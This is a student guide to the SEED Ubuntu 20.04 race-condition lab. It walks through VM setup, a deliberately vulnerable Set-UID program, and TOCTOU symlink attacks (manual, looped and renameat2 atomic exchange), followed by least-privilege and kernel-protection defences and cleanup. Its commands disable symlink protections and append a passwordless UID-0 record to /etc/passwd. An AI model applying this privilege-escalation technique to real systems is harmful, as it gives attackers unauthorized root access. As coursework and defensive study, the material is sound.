# Member 5 — complete Race-Condition lab guide

**Your practical:** the SEED Ubuntu 20.04 **Race-Condition Vulnerability Lab**. Follow this guide in order. It covers the official tasks and your group-division deliverables.

The original lecturer text and division PDF are in `course-materials/`. For Member 6, use `../Member6/START_TO_FINISH_GUIDE.md`; Dirty COW requires a separate old Ubuntu 12.04 VM. The existing S01/S02 screenshots in your evidence folder are preserved; compare them with this guide's checkpoints and supplement them if needed.

**How to use this document:** commands labelled **Windows PowerShell** run on your Windows computer. All other command blocks run in a **terminal inside the SEED Ubuntu VM**. Do not type the Markdown backticks. `[INSERT ...]` denotes a placeholder for evidence you must collect, not a command.

## 1. What you must finish

| Requirement from your Member 5 division | Work in this guide | Evidence / deliverable |
|---|---|---|
| Set up and perform the lab | Sections 3–12 | Working VM; Tasks 1, 2.A–C, 3.A–B |
| Explain a race condition before the demo | Section 2 | Definition and timing diagram |
| Show the vulnerable program | Sections 5–6 | `vulp.c`, `access()`/`fopen()` explanation |
| Document commands and procedure | Sections 4–12 | Logs and report methods |
| Screenshots of setup, execution and result | Checkpoints S01–S15 | Named evidence images |
| Explain cause and attacker gain | Sections 2, 8–10 | TOCTOU and verified UID 0 |
| Explain secure handling, permissions, atomic operations and temporary files | Sections 11–13 | Two tested defences plus design discussion |
| Short live demonstration | Section 16 and `PRESENTATION_PLAN.md` | Rehearsed demo with saved evidence |

The lecturer text lists authentication topics and links to both labs. The division assigns the authentication topics to Members 1–4 and Dirty COW to Member 6. Your useful link to the authentication presentation is: **a local file-handling flaw can undermine the account database and give an attacker a UID-0 account despite the intended login controls.** This is a local privilege-escalation lab, not a remote login exploit.

### Details to confirm with your group/lecturer

The supplied files do not state these, so fill them in rather than assume:

* Deadline: `[INSERT]`
* Presentation date and your time allowance: `[INSERT]`
* Individual report or one combined group report: `[INSERT]`
* Required format / upload location / naming convention: `[INSERT]`
* Any additional rubric or lecturer modifications on the LMS: `[INSERT]`

Proceed with the full linked lab while these are being confirmed. Suggested personal schedule: setup and preparation in one session, tasks/evidence in a second session, then report and rehearsal. The SEED site estimates about two supervised hours, but downloading the VM and debugging may take longer.

## 2. Understand the demonstration first

A **race condition** occurs when operations run concurrently and the outcome depends on their timing. **TOCTOU** means **time of check to time of use**: a program checks an object, but the object referred to by a name changes before the program uses it.

In this lab, the vulnerable executable is **root-owned and Set-UID**. When `seed` runs it, its real UID is that of `seed`, while its effective UID is root (0). `access(path, W_OK)` checks using the real user's identity; the later `fopen()` operates with the process's effective privileges. `/tmp/XYZ` is a predictable pathname the attacker can replace with a symbolic link.

```text
Time       Privileged victim                   Attacker (ordinary seed)
 t0                                            XYZ -> /dev/null
 t1        access("/tmp/XYZ", W_OK) passes
 t2                                            XYZ -> /etc/passwd
 t3        fopen("/tmp/XYZ", "a+")
 t4        Appends input to /etc/passwd
```

`/dev/null` is writable by ordinary users and discards writes. `/etc/passwd` is normally readable but not writable by them. A **symlink** redirects pathname resolution; it does not grant permissions by itself. The victim's privilege supplies the otherwise forbidden write. The error is treating two resolutions of a mutable pathname as if they identify the same file.

The sample account entry is:

```text
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
```

The seven fields are username, password hash, UID, GID, comment, home, and shell. **UID 0 grants root privileges; the name `test` does not.** Modern normal accounts use `x` here and store their hashes in `/etc/shadow`. This lab uses an inline legacy hash to avoid changing both files. Its empty-password behaviour must be tested in Task 1; it is not universal across Linux versions and authentication policies.

The victim reads at most **50 characters** with `%50s`, stopping at whitespace. The provided record fits. A full modern SHA-512 hash generally does not fit; do not paste one from `/etc/shadow` into this input.

## 3. Install the environment on Windows

### 3.1 What you need

| Item | Where | Purpose |
|---|---|---|
| Oracle VirtualBox, Windows host installer | https://www.virtualbox.org/wiki/Downloads | Runs the VM |
| Prebuilt `SEED-Ubuntu20.04.zip` | https://seedsecuritylabs.org/labsetup.html | Contains the Ubuntu 20.04 virtual disk |
| Official Race-Condition PDF and Labsetup ZIP | Links in Section 4 | Authoritative task sheet and original C source |
| `gcc`, Bash, coreutils, `unzip`, `wget`, `nano` | Inside Ubuntu; usually already installed | Build, run, download and edit |
| Windows Snipping Tool or Ubuntu screenshot tool | Host / guest | Capture screenshots |
| This `Member5` folder | Current project | Guide, runnable files and report template |

No Kali installation, Docker container, paid software, VirtualBox Extension Pack, Python exploit framework or separate vulnerable kernel is required. The race is deliberately present in the **application program**. Use the tested Ubuntu 20.04 image for reproducibility.

Practical host recommendation, not a lecturer requirement: an Intel/AMD 64-bit Windows machine, roughly 8 GB RAM or more, hardware virtualisation enabled and approximately 30–40 GB free disk space for the download, extracted disk and snapshots. The ZIP is about 4 GB. Allocate 2–4 GB RAM to the VM according to available host memory and 2 virtual CPUs if available. The SEED manual recommends 2 GB; one CPU can also work because scheduling can interleave processes.

1. In Windows, open **Task Manager → Performance → CPU** and check **Virtualisation: Enabled**. If disabled, enable Intel VT-x / AMD-V / SVM in your machine's UEFI/BIOS, following the manufacturer's instructions.
2. Install a currently supported VirtualBox release for your Windows version from the official site. The SEED manual records testing on 6.1.16; that is historical test information, not a requirement to install that old release. Newer UI labels may differ.
3. Download the **Ubuntu 20.04 Intel/AMD** image from the SEED page, then extract it into a permanent folder such as `D:\VMs\SEED-Ubuntu20.04`. Do not attempt to boot the ZIP.
4. Optional transfer-integrity check in **Windows PowerShell**, substituting the actual download path:

```powershell
Get-FileHash "$env:USERPROFILE\Downloads\SEED-Ubuntu20.04.zip" -Algorithm MD5
```

The SEED page currently publishes `f3d2227c92219265679400064a0a1287`. This MD5 is a download-integrity comparison, not a modern authenticity guarantee. Use the official HTTPS download link and recheck the page if the image changes.

5. In VirtualBox select **New**. Name: `ISSD-Member5-SEED20`. Type: Linux; version: **Ubuntu (64-bit)**. Skip unattended installation / leave ISO empty: you already have a preinstalled virtual disk.
6. Choose **Use an existing virtual hard disk**, then browse to the extracted `.vdi`. If the wizard creates an empty disk, remove that empty attachment and attach the downloaded VDI under **Settings → Storage** before booting. Do not create a fresh Ubuntu installation by mistake.
7. Configure RAM/CPUs as above. Set graphics controller **VMSVGA**, with around 64–128 MB video memory. Use **NAT** networking for downloads. Shared clipboard may be set to bidirectional to paste commands.
8. Start the VM and log in: username **`seed`**, password **`dees`**. `sudo` uses the same password; terminal password entry shows no characters.
9. Take a powered-off or consistent clean snapshot called **`M5-clean-before-lab`** using VirtualBox's Snapshots view. Later make a prepared snapshot after building and backing up the baseline. Export evidence before restoring snapshots, since rollback also rolls back guest files.

**S01 — TAKE SCREENSHOT NOW:** VirtualBox VM settings/name, RAM/CPU and attached SEED disk. Save `S01-vm-setup.png`; two images with `a`/`b` suffixes are fine if needed.

For a Windows ARM machine, do not assume this Intel/AMD image will work. Confirm your architecture and consult the SEED setup options; this walkthrough is for the x86-64 Windows setup.

## 4. First commands and copying the files

Open an Ubuntu terminal using **Ctrl+Alt+T**. Run:

```bash
whoami
id
lsb_release -a
uname -r
uname -m
command -v gcc bash unzip wget nano
gcc --version
```

Expected: ordinary user `seed`, Ubuntu 20.04, `x86_64`. Record your actual kernel/compiler versions. If tools are missing, install them **inside the VM**:

```bash
sudo apt update
sudo apt install build-essential unzip wget nano
```

A full distribution upgrade is not part of this lab. If package downloads fail, check NAT, internet connectivity and the actual repository error before changing distributions.

**S02 — TAKE SCREENSHOT NOW:** OS/kernel, compiler and ordinary-user identity. Save `S02-guest-environment.png`.

### 4.1 Download the original lab materials into the guest

```bash
mkdir -p ~/issd-member5/reference ~/issd-member5/evidence
cd ~/issd-member5/reference
wget -O Race_Condition.pdf https://seedsecuritylabs.org/Labs_20.04/Files/Race_Condition/Race_Condition.pdf
wget -O Labsetup.zip https://seedsecuritylabs.org/Labs_20.04/Files/Race_Condition/Labsetup.zip
unzip -l Labsetup.zip
unzip Labsetup.zip
find . -name vulp.c -print
```

The `find` output tells you the actual location of the original `vulp.c`; inspect it using `less <actual-path>` or the file manager. The official site explicitly says **not to unzip or work inside a shared folder**: Set-UID, permissions and symlinks can behave incorrectly there. Use `/home/seed/...` on the guest's Linux filesystem.

### 4.2 Copy this pack into the VM

Simplest method: in VirtualBox Settings → Shared Folders, add the Windows **`Member5`** folder from this project as a read-only shared folder named **`M5pack`**. Add it while the VM is powered off if necessary. After boot, mount and copy:

```bash
mkdir -p ~/m5-transfer ~/issd-member5/lab-files
sudo mount -t vboxsf M5pack ~/m5-transfer
cp -R ~/m5-transfer/lab-files/. ~/issd-member5/lab-files/
cd ~/issd-member5/lab-files
chmod 700 ~/issd-member5 ~/issd-member5/lab-files
sed -i 's/\r$//' *.sh *.c
ls -l
pwd
findmnt -T . -o TARGET,FSTYPE,OPTIONS
```

Your working path should be `/home/seed/issd-member5/lab-files`, with a Linux filesystem such as `ext4`, not `vboxsf`, and without a `nosuid` mount option. `sed` normalises Windows line endings. If Guest Additions/shared folders do not work, copy the folder using a ZIP transfer or paste the file contents into `nano` files in that same guest directory; the exploit does not depend on sharing.

Open **two Ubuntu terminals**, both at this directory. Refer to them as **A = attacker**, **B = victim/monitor**. Use `cd ~/issd-member5/lab-files` in each new terminal. An optional third terminal can display code and evidence.

## 5. Save a baseline and build the programs

### 5.1 Back up before changing the lab VM

First check that no account named `test` already exists:

```bash
getent passwd test
```

No output is expected. If it exists from an earlier attempt, restore your original clean snapshot before proceeding; do not overwrite a genuine existing account. Then, **once for this clean VM**:

```bash
cd ~/issd-member5/lab-files
mkdir -p logs
sudo test ! -e /root/issd-member5-passwd.original && sudo cp -a /etc/passwd /root/issd-member5-passwd.original
sudo ls -l /root/issd-member5-passwd.original
if [ ! -e ../sysctl-before.txt ]; then
    sysctl fs.protected_symlinks fs.protected_regular > ../sysctl-before.txt
fi
cat ../sysctl-before.txt
sha256sum /etc/passwd | tee ../passwd-before.sha256
```

Do not replace the original backup with a version containing the injected account. The first command intentionally does not overwrite an existing backup. Work in a disposable lab VM and do not add/remove other users during the exercises: baseline restoration replaces the whole password file.

Temporarily disable the two protections required by the official Ubuntu 20.04 lab:

```bash
sudo sysctl -w fs.protected_symlinks=0
sudo sysctl -w fs.protected_regular=0
sysctl fs.protected_symlinks fs.protected_regular
ls -ld /tmp
```

These runtime changes are not edits to `/etc/sysctl.conf`. `/tmp` normally ends in `t` (`drwxrwxrwt`), the sticky bit. Do not turn off the sticky bit: it is essential to Task 2.C's explanation.

### 5.2 Understand exactly which file runs

| Source / helper | Output / invocation | Use |
|---|---|---|
| `vulp.c` | `./vulp` | Vulnerable Set-UID program; **no artificial delay** |
| Same source with `-DDEMO_DELAY=10` | `./vulp_slow` | Task 2.A, 10-second manual timing window |
| Same source with `-DLEAST_PRIVILEGE` | `./vulp_least` | Task 3.A, drop effective privilege during file operations |
| `attack_naive.c` | `./attack_naive` | Task 2.B, repeatedly unlink/create the symlink |
| `attack_atomic.c` | `./attack_atomic` | Task 2.C and defence tests, atomic link exchange |
| `build.sh` | `bash build.sh` | Compile all five binaries; install Set-UID bits on victims |
| `run_trials.sh` | `bash run_trials.sh ./vulp 300 task2b` | Repeat victim for up to 300 seconds and detect file-content change |
| `input.txt` | Input to victim through `< input.txt` | One password-file record created in Task 1 |

Build and inspect:

```bash
bash build.sh
nl -ba vulp.c
```

The helper uses these important operations:

```bash
gcc -Wall -Wextra -O0 vulp.c -o vulp
gcc -Wall -Wextra -O0 -DDEMO_DELAY=10 vulp.c -o vulp_slow
gcc -Wall -Wextra -O0 -DLEAST_PRIVILEGE vulp.c -o vulp_least
sudo chown root:root vulp vulp_slow vulp_least
sudo chmod 4755 vulp vulp_slow vulp_least
```

The permission string must show **`-rwsr-xr-x`**, owner **root**. `chown` comes before `chmod`, because changing ownership can clear Set-UID. Rebuilding resets the binary, so reapply ownership and Set-UID after any compilation. Attacker binaries stay ordinary-user programs. **Run the attackers, victim and monitor without `sudo`**; otherwise you cannot demonstrate unprivileged exploitation.

This `vulp.c` is an explained adaptation of SEED's original: checked input/I/O, compile-time variants and a message in the slow variant. The no-delay build preserves the original vulnerable `access()` then `fopen()` pattern. The official source and PDF should remain in `reference/` for comparison.

**S03 — TAKE SCREENSHOT NOW:** protection values, `/tmp` sticky bit and victim ownership/Set-UID. Save `S03-lab-permissions.png`.

**S04 — TAKE SCREENSHOT NOW:** the vulnerable `access()` → `fopen()` code and relevant comments; keep it readable. Save `S04-vulnerable-code.png`.

At this point make an optional snapshot **`M5-prepared-clean`**. It should contain your files and original backup, with **no `test` account**, and have no attacker running. Record that its protections are disabled for lab use.

## 6. Task 1 — choose and validate the target record

**Goal:** establish that the proposed account entry is accepted by this VM. This task deliberately uses `sudo`; it is preparation, **not exploit success**.

```bash
cd ~/issd-member5/lab-files
printf '%s\n' 'test:U6aMy0wojraho:0:0:test:/root:/bin/bash' > input.txt
cat input.txt
awk '{ print "Record length:", length($0) }' input.txt
ls -l /etc/passwd
test -w /etc/passwd && echo 'Unexpected: writable' || echo 'seed cannot write /etc/passwd'
sudo sh -c 'printf "\n" >> /etc/passwd'
sudo tee -a /etc/passwd < input.txt > /dev/null
su - test
```

If prompted for a password, press **Enter** without typing one. In the resulting shell run:

```bash
id
whoami
```

Look for **`uid=0`** from `id`. `whoami` may say `root` rather than `test`, since multiple names now map to UID 0. This is normal; `id` is the stronger evidence. Run `exit` **once** to return to your original `seed` shell, then run `id` again.

**S05 — TAKE SCREENSHOT NOW:** Task 1 login and `id`, with a caption explicitly saying the entry was **manually inserted for validation**. Save `S05-task1-target-validation.png`.

If login fails, record the actual failure rather than assume the hash works. The sixth character in `U6aMy0wojraho` is the digit **0**. If the VM rejects empty-password login, restore the baseline as below and optionally test a known nonempty legacy-hash entry on this same VM:

```bash
python3 -c 'import crypt; print("test:" + crypt.crypt("LabPass5", "ab") + ":0:0:test:/root:/bin/bash")' > input.txt
awk '{ print "Record length:", length($0) }' input.txt
```

This optional fallback is for the SEED Python 3.8 environment, where `crypt` is available; enter **`LabPass5`** at `su` prompts. Repeat the manual insertion and login test above **without rerunning the first `printf` that would overwrite `input.txt`**. Record this deviation. If the policy rejects legacy hashes altogether, stop and verify that you are using the intended SEED image; do not silently alter the exercise or claim success.

### Reset procedure — use after every attack or manual account insertion

1. Stop the trial monitor (Ctrl+C in B if it is still running).
2. Stop the attacker (Ctrl+C in A). For the slow demo, wait until the victim has returned. Never restore while a victim can still write.
3. Exit any `su - test` root shell back to `seed`, and run `id` to verify.
4. In a `seed` terminal run:

```bash
pgrep -a -x attack_naive
pgrep -a -x attack_atomic
pgrep -a -x vulp
pgrep -a -x vulp_slow
pgrep -a -x vulp_least
```

No output should remain. If a named process still exists, stop it in its terminal before continuing. Then:

```bash
sudo cp -a /root/issd-member5-passwd.original /etc/passwd
sudo cmp /etc/passwd /root/issd-member5-passwd.original && echo 'Clean password-file baseline restored'
grep '^test:' /etc/passwd || echo 'No test record remains'
sudo rm -f /tmp/XYZ /tmp/ABC
id
```

`sudo rm` here is a controlled lab reset, not part of the attack. Keep `input.txt` for the next task. The baseline must be restored after Task 1 so the attack creates the record independently.

## 7. Task 2.A — manual attack with a 10-second window

**Goal:** make the timing visible and predictable. This is the official slow-machine simulation; do not present it as the real no-delay experiment.

Confirm both protections are 0 and the baseline is clean. In **Terminal A**:

```bash
cd ~/issd-member5/lab-files
ln -s /dev/null /tmp/XYZ
ls -l /tmp/XYZ
```

In **Terminal B**:

```bash
cd ~/issd-member5/lab-files
id
./vulp_slow < input.txt
```

As soon as B prints **`Check passed ... waiting 10 seconds`**, run in **A** within those 10 seconds:

```bash
ln -sfn /etc/passwd /tmp/XYZ
ls -l /tmp/XYZ
```

After B returns:

```bash
grep '^test:' /etc/passwd
su - test
id
```

Use Enter or the validated fallback password from Task 1. This time, you must not have used `sudo` to append the account. If there is no record, reset, recreate the `/dev/null` link and try again. A failed timing attempt is legitimate evidence, but you still need a successful run for your intended demonstration.

**S06 — TAKE SCREENSHOT during the wait/link switch:** capture the slow-program message and A's link target; save `S06-task2a-timing.png`.

**S07 — TAKE SCREENSHOT after login:** show the appended record and `id` reporting UID 0. Save `S07-task2a-result.png`. Then `exit` and perform the reset procedure.

Write down: what the check saw, what the open saw, how you knew the write came from the victim, and why `seed` could not directly write the target.

## 8. Task 2.B — real attack without `sleep`

**Goal:** win the actual short timing window by repeated concurrent attempts. The normal `vulp` build has `DEMO_DELAY=0`; no `sleep` runs in it. The separate `vulp_slow` executable is only for Task 2.A.

After reset, run in **Terminal A**:

```bash
cd ~/issd-member5/lab-files
id
./attack_naive
```

Wait until it prints **`Naive switching active`**. In **Terminal B**:

```bash
cd ~/issd-member5/lab-files
bash run_trials.sh ./vulp 300 task2b
```

The attacker alternates `/tmp/XYZ` between `/dev/null` and `/etc/passwd`. The monitor feeds `input.txt` into the victim, records an initial SHA-256 and stops if the file's content changes or 300 seconds expire. This replaces the official example's coarse `ls -l` timestamp comparison with content hashing. Logs are `logs/task2b-summary.txt` and `logs/task2b-last-output.txt`; the latter holds only the most recent victim output to avoid enormous logs.

**S08 — TAKE SCREENSHOT NOW:** both programs running, ordinary-user identity and monitor attempts/status. Save `S08-task2b-running.png`.

If the monitor reports a change, stop A immediately with Ctrl+C. Check:

```bash
cat logs/task2b-summary.txt
grep '^test:' /etc/passwd
su - test
id
```

Record actual attempts and elapsed seconds from the log. A changed hash alone is **not** sufficient: verify the complete record, then a login giving UID 0. Export a result image as `S09-task2b-result.png`. Exit the root shell and reset.

### If the naive attacker stalls or exits with a permissions error

Stop B first, and stop A if it is still running. Inspect:

```bash
ls -ld /tmp
ls -l /tmp/XYZ
stat -c 'type=%F owner=%U uid=%u mode=%a' /tmp/XYZ
```

You may find a **root-owned regular file** rather than a seed-owned link. Between `unlink()` and `symlink()`, the pathname is missing. If the victim previously passed its check, its `fopen(..., "a+")` may now create a regular file owned by root. `/tmp`'s sticky bit prevents `seed` from removing it. Our naive attacker checks errors and exits instead of looping silently forever.

**S10 — TAKE SCREENSHOT if this occurs:** show the error, ownership and sticky bit; save `S10-task2b-sticky-bit.png`. If it does not occur, write **“not observed in my runs”** and explain the documented failure mechanism without inventing evidence.

After recording the failure, use the reset procedure and retry A then B, using a new label such as `task2b-retry1` to preserve the earlier log:

```bash
bash run_trials.sh ./vulp 300 task2b-retry1
```

Repeat bounded attempts as needed; the official sheet suggests checking ownership if still unsuccessful after about ten minutes. Record administrator-assisted resets accurately. Task 2.C removes this specific missing-path problem.

## 9. Task 2.C — improved atomic attack

**Goal:** exchange two existing links atomically so there is no unlink/create gap during switching.

Start from the clean reset state, with both protections still 0. In **A**:

```bash
./attack_atomic
```

Only after **`Atomic switching active`** appears, run in **B**:

```bash
bash run_trials.sh ./vulp 300 task2c
```

The attack initially creates `/tmp/XYZ -> /dev/null` and `/tmp/ABC -> /etc/passwd`, then repeatedly calls:

```c
renameat2(AT_FDCWD, "/tmp/XYZ", AT_FDCWD, "/tmp/ABC", RENAME_EXCHANGE);
```

`RENAME_EXCHANGE` swaps the two directory entries atomically. The **initial setup is still separate operations**, so the victim must only start after initialization. Atomic exchange fixes the attacker's own gap; it **does not fix the vulnerable victim**, whose check and use are still separate.

On a detected change, stop A, inspect the entry, run `su - test`, and show `id`. Save attempts/time. **S11 — TAKE SCREENSHOT:** running method/summary plus verified result, using `S11-task2c-atomic-result.png` (or `a`/`b` images). Exit and reset afterwards.

If the bounded run times out, stop both, inspect configuration and retry with a distinct log label. A race remains probabilistic; atomic switching does not promise instant success or a particular attempt count.

## 10. How to describe the result correctly

Before exploitation, the attacker is `seed` with a nonzero UID and cannot write `/etc/passwd`. A vulnerable root-owned Set-UID executable is already installed as part of the **lab setup**. The attacker controls the link timing and the input string, not the target file's direct write permission. The privileged program then appends the chosen record to the protected file.

The injected record maps `test` to UID 0. A successful `su - test` followed by `id` demonstrates root access. Do not use `sudo su`, `sudo -i`, or `sudo ./vulp` as your success proof: those would use privileges you already had for administration.

Use three distinct statements in the report:

1. **Expected:** why the code predicts a privileged append.
2. **Observed:** the exact commands, output and evidence from your run.
3. **Conclusion:** what those observations prove and what they do not.

## 11. Task 3.A — principle of least privilege

**Goal:** test a program-level fix independently of OS symlink protection.

Reset the account/links first. Keep both controls **disabled**:

```bash
sudo sysctl -w fs.protected_symlinks=0
sudo sysctl -w fs.protected_regular=0
ls -l vulp_least
nl -ba vulp.c
```

In `vulp_least`, `seteuid(getuid())` drops the effective UID to the calling ordinary user **before both `access()` and `fopen()`**. It remains dropped through writing and closing. A switch to `/etc/passwd` now leads to an unprivileged open, which should fail. The program checks all relevant failure paths. It restores the saved effective UID only after file work is finished to illustrate the official temporary-drop exercise; this tiny program has no practical need to regain root and exits immediately.

In **A** start `./attack_atomic`. After initialization, run in **B**:

```bash
bash run_trials.sh ./vulp_least 300 task3a
```

After it finishes, stop A. Record the trial duration, count, baseline hash and lack/presence of changes. To show a deterministic denied target open rather than relying on whichever output was last:

```bash
ln -sfn /etc/passwd /tmp/XYZ
./vulp_least < input.txt
sha256sum /etc/passwd
grep '^test:' /etc/passwd || echo 'No test account'
```

This static link will normally fail at `access()` with `No permission`; during racing, an open may fail instead. Do not claim that this static check alone proves the race is fixed—the preceding concurrent trial and privilege reasoning support that explanation.

Also confirm normal permitted functionality with the attacker stopped:

```bash
printf 'ordinary writable file\n' > ../allowed.txt
ln -sfn "$HOME/issd-member5/allowed.txt" /tmp/XYZ
printf 'normal-operation\n' | ./vulp_least
cat ../allowed.txt
```

**S12 — TAKE SCREENSHOT:** fixed-code excerpt, 300-second summary, no injected account and permitted-file write. Save `S12-task3a-least-privilege.png` or several readable images.

Expected: permitted file writing works but the protected target is unchanged. Report **“no success observed in N attempts over T seconds”**, then explain why the privilege boundary prevents this write. Do not turn a finite trial into a universal empirical proof. Reset before Task 3.B.

## 12. Task 3.B — Ubuntu built-in symlink protection

**Goal:** test the OS defence using the **original vulnerable `vulp`**, not the fixed variant.

```bash
sudo sysctl -w fs.protected_symlinks=1
sudo sysctl -w fs.protected_regular=0
sysctl fs.protected_symlinks fs.protected_regular
ls -ld /tmp
ls -l vulp
```

Leave `protected_regular=0` just for this experiment so the symlink defence is the control that changed. In **A**, start `./attack_atomic`; after initialization, in **B**:

```bash
bash run_trials.sh ./vulp 300 task3b
```

Stop A after the trial. Obtain a simple visible example with a stable seed-owned link:

```bash
ln -sfn /dev/null /tmp/XYZ
ls -ld /tmp /tmp/XYZ
./vulp < input.txt
sha256sum /etc/passwd
grep '^test:' /etc/passwd || echo 'No test account'
```

The victim's real-user check can pass, but its root-effective open of a seed-owned symlink in root-owned, sticky world-writable `/tmp` is expected to fail with an open permission error.

**S13 — TAKE SCREENSHOT:** enabled control, original victim, attack summary, denied open and unchanged target. Save `S13-task3b-symlink-protection.png`.

### Explain how the defence works and its limits

With `fs.protected_symlinks=1`, Linux permits following a symlink when **any** of the following holds:

* The symlink is outside a sticky world-writable directory; or
* The follower's filesystem UID (normally tracking effective UID) matches the symlink owner; or
* The symlink owner matches the containing directory owner.

In this lab the link is seed-owned, the follower's effective/filesystem UID is root, and `/tmp` is root-owned. None of the permitted cases applies to that privileged open. The restriction blocks this cross-owner path traversal.

Limitations: it is **not a general race-condition fix**; it depends on directory context and ownership and does not make separate check/use operations atomic. Races involving other objects or locations still require sound program design. Keep OS protection enabled and fix the program as well.

`fs.protected_regular` is a different rule concerning `O_CREAT` opens of other users' regular files in sticky writable directories. It is not simply a blanket rule that root cannot write any file in `/tmp`.

## 13. Countermeasure discussion required by your division

| Measure | Why it helps | Important qualification |
|---|---|---|
| Least privilege | Perform user-directed file operations as the real user; a target switch cannot acquire root write authority | Drop **before** the sensitive open; check errors; avoid unnecessary restoration |
| Secure file handling | Open the intended file once and operate on the resulting descriptor; use `fstat()` for appropriate validation of that opened object | A prior pathname-based `access()` check does not bind a later open to the same object |
| Atomic operations | Use operations that combine the required action, e.g. exclusive creation with `O_CREAT | O_EXCL`, rather than a separate existence check then creation | Atomicity must cover the security-relevant action; just making one unrelated step atomic is insufficient |
| Proper permissions | Restrict who can modify trusted directories and data; avoid unnecessary Set-UID executables | `/etc/passwd` already has restrictive permissions; the privileged victim bypasses the ordinary user's direct-write restriction |
| Safe temporary files | Use `mkstemp()` and keep its returned descriptor, preferably in an appropriately private directory | Do not close it and reopen an attacker-controlled predictable name, recreating the race |
| Symlink-aware opens | Where appropriate, `O_NOFOLLOW` rejects a final symlink; directory-descriptor APIs and Linux `openat2()` can constrain path resolution | `O_NOFOLLOW` alone does not protect every intermediate path component; flags must fit the intended operation |
| OS hardening | Keep sticky symlink/regular-file protections enabled | Defence in depth, not a substitute for correcting the privileged code |

An advisory lock alone is not a complete answer: an attacker need not cooperate with the lock. Also distinguish Task 2.C's atomic operation, which improves the attacker, from a defender's secure atomic operation.

## 14. Screenshot and report workflow

Use **Win+Shift+S** to capture the visible VM and save PNGs on Windows under this project's `Member5/evidence/`. Alternatively save screenshots in the guest and copy them out. Host-side screenshots survive guest snapshot restoration.

At every S-number checkpoint:

1. Increase terminal font size until the command and output are readable.
2. Include the command, result and enough prompt/window context to show it is the lab VM.
3. Name the screenshot using the suggested filename; add `a`, `b` where necessary.
4. Insert it into the matching placeholder in `REPORT_TEMPLATE.md` or the exported Word report.
5. Add a factual caption: **action → observation → meaning**. Add the measured duration/attempt count when relevant.

Copy `lab-files/logs/`, the final C/shell files and your notes out of the VM after each successful session. A read-only transfer share cannot receive exports; use a separate writable share, a file-transfer method, or save screenshots directly on the host.

The report template already contains the reasoning structure. Replace every `[INSERT ...]`, `[OBSERVED ...]`, `[PASS/FAIL ...]` and unticked completion box with real evidence or an honest explanation. Never submit the placeholder-only template as a completed lab.

## 15. Troubleshooting

| Symptom | Checks / action |
|---|---|
| VirtualBox shows no 64-bit Ubuntu option / virtualisation error | Verify x86-64 hardware and BIOS virtualisation; use a supported VirtualBox release. If Windows hypervisor interaction is reported, follow current Oracle guidance for that exact error rather than disabling Windows features blindly. |
| Black screen or tiny display | Use VMSVGA, increase video memory, adjust scaling; consult SEED VM manual. |
| `No bootable medium` | Ensure the extracted SEED VDI is attached; an empty newly created disk has no OS. |
| Shared folder mount fails | Check share name and Guest Additions; use file transfer instead. It is only a transfer convenience. |
| `bad interpreter` / `$'\r'` errors | In guest `lab-files`, run `sed -i 's/\r$//' *.sh *.c`. Invoke helpers with `bash file.sh`. |
| `renameat2`/`RENAME_EXCHANGE` not declared | Use the supplied `_GNU_SOURCE` and headers with GCC inside SEED Ubuntu 20.04, not a Windows C compiler. |
| `renameat2: Invalid argument` or `Operation not supported` | Confirm both paths are in guest `/tmp` on a supporting Linux filesystem, not a host share or unusual mount. |
| No root privilege / no target changes | Verify `id` before the run, root ownership and mode 4755 on victim, protections at correct values, and no `nosuid` on working mount. |
| Immediate “test already exists” | You have not reset after the previous task. Stop all processes, restore the original baseline and verify no record remains. |
| `unlink` / `symlink` permission error | Stop processes and inspect `/tmp/XYZ` ownership. Record Task 2.B's root-owned-file issue before resetting. |
| `No permission` repeats | Some failures are expected while XYZ points to the protected target. Check attacker is running, user identity, protection values and link ownership. |
| Program hangs awaiting input | Use `< input.txt`, or type the short string and press Enter. |
| `Open failed: Permission denied` | Expected in defence tests; in attack tasks check symlink/regular protections and mount/Set-UID configuration. |
| Five-minute real-attack run fails | Record it, stop both processes, inspect conditions, then retry. Do not insert `sleep` into the real attack and label it Task 2.B. |
| File changed but `su` fails | Inspect complete record and Task 1 compatibility; changed file is not proof of successful login. Keep evidence and restore the baseline. |
| Guest logins break after an experiment | Use the saved VirtualBox clean/prepared snapshot. Preserve host screenshots first; restore the baseline from a functioning administrative session if one remains. |

## 16. Presentation preparation

Suggested personal segment: around **5–7 minutes**, subject to your group's actual allowance. See `PRESENTATION_PLAN.md` for slides and speaking notes.

1. Explain the race and Set-UID assumptions before running anything.
2. Show the few vulnerable lines and the permission checks.
3. Demonstrate **Task 2.A**, explicitly labelling its 10-second delay as a teaching aid.
4. Show your recorded genuine no-delay Task 2.C result and measured attempts/time.
5. Explain the two tested countermeasures and show defence screenshots.
6. End with the authentication connection and one clear takeaway.

A no-delay race may not finish inside a live presentation slot. Keep your actual screenshots/logs or a short recording ready; state when you switch to recorded evidence. Do not claim a screenshot is a live result. A successful slow demo does not replace completing the real-attack tasks beforehand.

Before rehearsal, restore/reset to a clean prepared state, verify the baseline, confirm both protections are 0 for the attack demonstration and that the binaries are present. After every rehearsal clean up again. Keep only the needed terminal windows open and enlarge the fonts.

## 17. Final cleanup and completion

After all evidence is saved, perform the reset procedure from Section 6. Then restore the actual protection values captured before the exercise:

```bash
cd ~/issd-member5/lab-files
cat ../sysctl-before.txt
sudo sysctl -p ../sysctl-before.txt
sysctl fs.protected_symlinks fs.protected_regular
sudo chmod 0755 vulp vulp_slow vulp_least
sudo rm -f /tmp/XYZ /tmp/ABC
sudo cmp /etc/passwd /root/issd-member5-passwd.original && echo 'Original password file restored'
grep '^test:' /etc/passwd || echo 'No test account'
ls -l vulp vulp_slow vulp_least
id
```

If the saved sysctl file is unavailable, consult the clean snapshot instead of guessing your previous values. `sysctl -p` reads the saved `key = value` lines and applies them at runtime. Removing Set-UID disables the demonstration privilege on the binaries; rerun `bash build.sh` and set the experiment controls explicitly for a later rehearsal.

**S14 — TAKE SCREENSHOT:** restored baseline/protections and removed Set-UID bits. Save `S14-cleanup.png`.

**S15 — SAVE FINAL ARTIFACT VIEW:** optional screenshot of your organised evidence/log/source files, `S15-deliverables.png`.

### Submission checklist

* [ ] Task 1 validation documented separately from exploit success.
* [ ] Task 2.A manual timing and successful result documented.
* [ ] Task 2.B real no-delay run completed; retries and sticky-bit issue accurately recorded.
* [ ] Task 2.C atomic-exchange attack completed and explained.
* [ ] Task 3.A least-privilege trial and permitted-file control documented.
* [ ] Task 3.B OS protection trial and its limits documented.
* [ ] Screenshots show setup, running attack and verified outcome, not just source code.
* [ ] Important commands and code excerpts have explanations.
